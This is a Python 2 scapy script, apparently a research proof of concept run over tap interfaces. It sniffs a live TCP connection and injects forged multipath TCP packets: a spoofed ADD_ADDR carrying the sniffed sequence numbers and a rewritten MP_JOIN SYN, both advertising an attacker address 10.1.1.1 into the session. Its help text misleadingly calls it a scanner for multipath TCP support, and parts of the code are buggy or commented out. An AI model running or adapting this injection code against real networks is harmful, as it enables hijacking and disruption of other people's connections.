import logging
import threading
import sys
logging.getLogger("scapy.runtime").setLevel(logging.DEBUG)

from scapy.all import *
from scapy.layers.inet import TCP, IP, Neighbor
from scapy.layers import mptcp
from scapy.sendrecv import sr1
import random
from scapy.all import *
from netaddr import *
import netaddr
from subprocess import check_output as execCommand
import inspect

class SYNThread (threading.Thread):
    def __init__(self, threadID, name, counter, serverIP):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.serverIP = serverIP
    def run(self):
        sniff_SYN(self.serverIP)


class SYNACKThread (threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
    def run(self):
        sniff_SYNACK()


def get_local_ip_address(target):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((str(target), 8000))
    ipaddr = s.getsockname()[0]
    s.close()
    return ipaddr


def makeMPAddAddr(sourceAddr, sport, dstAddr, dport, initTCPSeq, initTCPAck):
    pkt = (IP(version=4L,src=sourceAddr,dst=dstAddr)/        \
        TCP(sport=sport,dport=dport,flags="A",seq=initTCPSeq,ack=initTCPAck, \
        options=[TCPOption_MP(mptcp=MPTCP_AddAddr(
                            address_id=5,
                            adv_addr="10.1.1.1"))]))
    #print pkt.show()
    return pkt


def defaultSend(srcIP, srcPort, dstIP, dstPort, sniffedSeq, sniffedAck, tap):
    pkt = makeMPAddAddr(srcIP, srcPort, dstIP, dstPort, \
                   sniffedSeq, sniffedAck)
    # print "\n\n\n SENDING "
    # pkt.show()
    # print "END \n\n\n"
    sr1(pkt,timeout=4,iface=tap)
    return

def parse_args():
    import argparse
    import itertools
    import sys

    parser = argparse.ArgumentParser(description='Network scanner to test hosts for multipath TCP support. Requires root privileges for scapy.')
    parser.add_argument('serverIP', action='store', help='Source IP address')
    parser.add_argument('clientIP', action='store', help='Destination IP address')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    return args


def modify_addr_id(pkt, aid):
    rcv = 0x00000000
    snd = 0x00000000
    bkp = 0L
    modified_options = []
    for opt in pkt[TCP].options:
        if opt.kind == 30:
            for o in opt.mptcp:
                if MPTCP_subtypes[o.subtype] == "MP_JOIN":
                    rcv = o.rcv_token
                    snd = o.snd_nonce
                    bkp = o.backup_flow
                    modified_options.append(TCPOption_MP(mptcp=MPTCP_JoinSYN(
                                        addr_id=aid,
                                        backup_flow=bkp,
                                        rcv_token=rcv,
                                        snd_nonce=snd)))
        else:
            modified_options.append(opt)
    pkt[TCP].options = modified_options
    print "\n\n\n\nModified Packet\n\n\n\n"
    pkt.show()
    return pkt

"""
def sniff_start_syn(p, serverIP):
    if p.haslayer(TCP) and p.haslayer(IP):
        if p[IP].src == serverIP:
            return False
        str = p.sprintf("%TCP.flags%")
        print p.sprintf("%TCP.seq% - %IP.src%")
        if "S" in str:
            return True
    return False


def sniff_SYN(serverIP):
    print "Start looking for SYN"
    # conf.iface='tap0'
    # synlist = sniff(iface='tap0', lfilter=lambda p: sniff_start_syn(p, serverIP), timeout=20, count=1)
    # if len(synlist) == 0:
    #     print "SORRY, no SYN received from client"
    #     return
    synlist = sniff(iface='tap0', timeout=10)
    pkt = None
    for p in synlist:
        if sniff_start_syn(p, serverIP):
            pkt = p
            print pkt
    # pkt = synlist[len(synlist)-1]
    #pkt.show()
    pkt[IP].dst = serverIP
    pkt[IP].src = "10.1.1.1"
    pkt[TCP].sport += 12
    time.sleep(1)
    pkts = modify_addr_id(pkt,5)
    pkts.show()
    for i in range(0,2):
        sendp(pkts,iface="tap2")
    print "Phase 1 completed"


def sniff_start_synack(p):
    if p.haslayer(TCP):
        str = p.sprintf("%TCP.flags%")
        if "SA" in str:
            return True
    return False


def sniff_SYNACK():
    print "\nStart looking for SYNACK"
    conf.iface='tap0'
    synlist = sniff(iface='tap0', lfilter=lambda p: sniff_start_synack(p), timeout=20, count=1)
    if len(synlist) == 0:
        print "SORRY, no SYNACK received from server"
        sys.exit(1)
    pkt = synlist[len(synlist)-1]
    print "PHASE 2 COMPLETED!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    return
"""


def sniff_SYNACK():
    #TODO
    pass


def sniff_SYN(serverIP):
    print "Start looking for SYN"
    execCommand("sudo tcpdump -c 1 -w " + inspect.stack()[0][3] + ".cap -i tap0  \"tcp[tcpflags] & tcp-syn != 0\"", shell = True)
    scan = rdpcap("" + inspect.stack()[0][3] + ".cap")
    execCommand("sudo rm " + inspect.stack()[0][3] + ".cap", shell = True)
    pkt = scan[0]
    pkt[IP].dst = serverIP
    pkt[IP].src = "10.1.1.1"
    pkt[TCP].sport += 12
    time.sleep(1)
    pkts = modify_addr_id(pkt,5)
    for i in range(0,2):
        sendp(pkts,iface="tap2")
    print "Phase 1 completed"


def sniff_start_lambda(p, srcIP):
    if p.haslayer(TCP):
        str = p.sprintf("%IP.src%")
        v1 = int(p.sprintf("%TCP.ack%"))
        v2 = int(p.sprintf("%TCP.seq%"))
        if str == srcIP and v1 > 0 and v2 > 0:
            return True
    return False

def main():
    args = parse_args()

    thread1 = SYNThread(1, "Syn capturing thread", 1, args.serverIP)
    thread1.start()
    # thread2 = SYNACKThread(1, "SynAck capturing thread", 1)
    # thread2.start()

    p = sniff(iface='tap0', lfilter=lambda p: sniff_start_lambda(p, args.clientIP), count=1)
    st1 = threading.Thread(target=defaultSend(args.clientIP, p[0][TCP].sport, args.serverIP, p[0][TCP].dport, (p[0][TCP].seq), (p[0][TCP].ack)-1000*1427, "tap2"))
    st1.start()

    p = sniff(iface='tap0', lfilter=lambda p: sniff_start_lambda(p, args.clientIP), count=1)
    st2 = threading.Thread(target=defaultSend(args.serverIP, p[0][TCP].dport, args.clientIP, p[0][TCP].sport, (p[0][TCP].ack), (p[0][TCP].seq)-1000*1427, "tap0"))
    st2.start()

    thread1.join()
    # thread2.join()

    return

if __name__ == "__main__":
    main()
